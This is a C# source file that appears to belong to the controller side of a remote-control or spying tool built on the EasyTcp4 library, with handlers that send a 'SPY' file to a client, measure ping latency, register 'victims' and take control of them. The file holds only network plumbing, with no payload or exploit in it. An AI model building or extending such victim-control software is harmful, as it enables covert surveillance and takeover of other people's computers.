using System;
using EasyTcp4;
using System.IO;
using Controller.Codes;
using EasyTcp4.Actions;
using System.Threading;
using Controller.Server;
using EasyTcp4.Actions.Utils;
using Controller.ActionClass;
using System.Threading.Tasks;

namespace Controller.CMDActions
{
    public static class Test
    {
        [EasyAction("UP")]
        public static async Task ULoad(Message M)
        {
            M.Client.SendAction("DOWN");
            var sw = new System.Diagnostics.Stopwatch();sw.Start();
            var FS = new FileStream("SPY-TFile.txt", FileMode.Open);
            await M.Client.PushStreamAsync(FS); // Send stream and use fileStream as source
            FS.Dispose();
            sw.Stop(); System.Windows.Forms.MessageBox.Show(sw.ElapsedMilliseconds.ToString());
        }
    }

    public static class Basic_Connections
    {
        private static readonly object PongLock = new object();

        [EasyAction("PONG")]
        public static void HandlePONG(Message PMsg)
        {
            var CurTime = DateTime.Now;
            var STime = PMsg.To<PingMGR>();
            var DiffTime = CurTime - STime.PingSTime;
            var IntMS = (int)DiffTime.TotalMilliseconds;
            SUtils.InstructUI("UP-Lat", $"{IntMS} MS");
            if (!TargetV.IsCurrentVMatched(PMsg)) return;

            if (Monitor.TryEnter(PongLock))
            {
                try
                {
                    Thread.Sleep(1000);
                    TargetV.ExecuteCMD("PING", new PingMGR { PingSTime = DateTime.Now });
                }
                finally { Monitor.Exit(PongLock); }
            }
        }

        [EasyAction("VICTIM-DETAILS")]
        public static void HandleConnect(Message Msg)
            => TargetV.AddNewVictim(Msg);

        [EasyAction("OKTakeControl")]
        public static void ManageCtrl(Message M)
            => TargetV.HandleVictimControl(M.To<ControlCMD>().FutID, M.Client);

        [EasyAction("Task-Update")]
        public static void HandleTaskResponse(Message TMsg)
            => Tasker.UpdateTask(TMsg.To<TaskReport>());
    }
}
